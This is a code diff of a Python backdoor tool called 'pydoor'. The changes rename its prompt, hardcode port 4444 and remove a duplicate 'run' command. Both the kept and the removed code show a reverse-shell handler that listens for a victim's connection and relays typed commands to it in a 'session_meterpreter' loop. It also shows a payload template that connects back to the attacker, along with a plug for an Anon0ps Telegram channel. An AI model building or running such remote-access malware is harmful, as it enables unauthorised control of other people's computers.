@@ -33,7 +33,7 @@ filename = 'null bytes '
 
 session = True
 while session:
-	text_main = input("ch13n@backdoor -> ")
+	text_main = input("pydoor > ")
 
 	if text_main == "help":
 		print("")
@@ -52,7 +52,6 @@ while session:
 | options          show options            |
 | help             helping for tools       |
 | exploit          run exploit victim      |
-| run              run exploit victim      |
 ============================================
 ''')
 		print("")
@@ -100,7 +99,7 @@ import os
 os.system('cls' if os.name == 'nt' else 'clear')
 
 ip = '{rhost}'
-port = {rport}
+port = 4444
 
 s = socket.socket(socket.AF_INET, 
 	socket.SOCK_STREAM)
@@ -147,14 +146,14 @@ while True:
 ======================================
 | options | IP              | PORT   |   
 |=====================================
-| LHOST   : {lhost}           {lport}
-| RHOST   : {rhost}           {rport}
+| LHOST   : {lhost}         {lport}
+| RHOST   : {rhost}         {rport}
 ======================================
 
 =======================
 | options |  File name|
 =======================
-| FILENAME | {filename}
+| FILENAME | {filename}.py
 =======================
 ''')
 
@@ -164,7 +163,7 @@ while True:
 		import sys
 
 		IP = f'{lhost}'
-		PORT = {lport}
+		PORT = 4444
 
 		s = socket.socket(socket.AF_INET,
 			socket.SOCK_STREAM)
@@ -208,53 +207,3 @@ while True:
 		          output = conn.recv(1024)
 		          print("\n", output, "\n")
 
-
-	elif text_main == "run":
-
-		import socket
-		import sys
-
-		IP = f'{lhost}'
-		PORT = {lport}
-
-		s = socket.socket(socket.AF_INET,
-			socket.SOCK_STREAM)
-
-		s.setsockopt(socket.SOL_SOCKET, 
-			socket.SO_REUSEADDR, 
-			1)
-
-		s.bind((IP, PORT))
-		s.listen(1)
-
-
-		print("")
-		print(f'[+] Starting Reverse Handler On {rhost}:{rport}')
-		time.sleep(2)
-		print('[*] Startingthe payload backdoor...')
-		time.sleep(1)
-		print('[*] Server is listening on '+ str(rhost) + ":" + str(rport) + '...')
-		conn, addr = s.accept()
-		print('[+] Connected Done From ', addr)
-		time.sleep(2)
-		print("[+] Join Us : https://t.me/Anon0psNews/")
-		time.sleep(1)
-		print("[+] session started...")
-
-		session_door = True
-
-		while session_door:
-
-		      sys.stdout.write("session_meterpreter > ")
-		      command = sys.stdin.readline()
-
-		      if command == 'exit\n':
-		          print('[+] Close')
-		          conn.send(b"exit")
-		          conn.close()
-		          break  
-
-		      elif command != '\n':
-		          conn.send(command.encode())
-		          output = conn.recv(1024)
-		          print("\n", output, "\n")
